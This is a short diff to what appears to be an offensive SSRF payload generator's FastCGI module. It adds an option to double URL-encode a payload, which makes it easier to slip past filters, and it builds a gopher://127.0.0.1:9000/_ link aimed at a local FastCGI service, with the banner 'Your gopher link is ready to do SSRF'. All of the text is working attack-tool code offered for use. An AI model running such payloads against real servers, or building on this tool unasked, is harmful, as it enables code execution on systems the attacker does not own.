@@ -27,8 +27,12 @@ def FastCGI():
 
     def get_payload(payload):
         finalpayload = urllib.parse.quote_plus(payload).replace("+","%20").replace("%2F","/")
+        doubleEncoded = input("\033[96m" +"Do you want to double encode the payload? (y/n): "+ "\033[0m")
+        if "y" in doubleEncoded:
+            finalpayload = urllib.parse.quote_plus(finalpayload)
+        
+        print("\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m")
         return "gopher://127.0.0.1:9000/_" + finalpayload
 
-    print("\033[93m" +"\nYour gopher link is ready to do SSRF: \n" + "\033[0m")
     print("\033[04m" + get_payload(payload)+ "\033[0m")
     print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+"\033[0m")
